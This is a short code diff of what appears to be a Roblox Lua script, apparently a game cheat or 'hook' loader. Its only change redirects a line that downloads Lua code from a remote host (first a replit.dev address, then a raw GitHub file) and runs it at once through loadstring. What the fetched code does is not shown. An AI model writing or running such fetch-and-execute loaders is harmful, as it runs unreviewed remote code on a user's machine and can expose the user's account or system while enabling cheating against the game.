@@ -39,4 +39,4 @@ task.spawn(function()
 end)
 task.wait(1)
 
-loadstring(request({Url='https://965435f9-6eff-4ab4-9259-62cbe229d331-00-1pqras9q2j5cj.kirk.replit.dev/Shit.lua',Method='GET'}).Body)();
+loadstring(request({Url='https://raw.githubusercontent.com/Demonitycc/amoungushookfix/refs/heads/main/shit',Method='GET'}).Body)();
